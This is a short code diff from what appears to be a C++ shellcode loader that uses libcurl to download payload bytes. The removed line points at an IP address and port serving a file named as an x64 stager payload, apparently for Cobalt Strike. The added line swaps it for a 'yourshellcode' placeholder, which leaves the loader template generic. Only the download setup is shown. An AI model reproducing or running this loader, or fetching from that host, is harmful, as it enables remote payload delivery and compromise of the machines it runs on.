@@ -71,7 +71,7 @@ int main() {
 
   curl_global_init(CURL_GLOBAL_ALL);
   curl = curl_easy_init();
-  std::string url = R"(https://43.241.16.222:43337/Temp/stager_x64_cs_payload_rawbytes)";
+  std::string url = R"(https://yourshellcode)";
   std::string response;
 
   curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
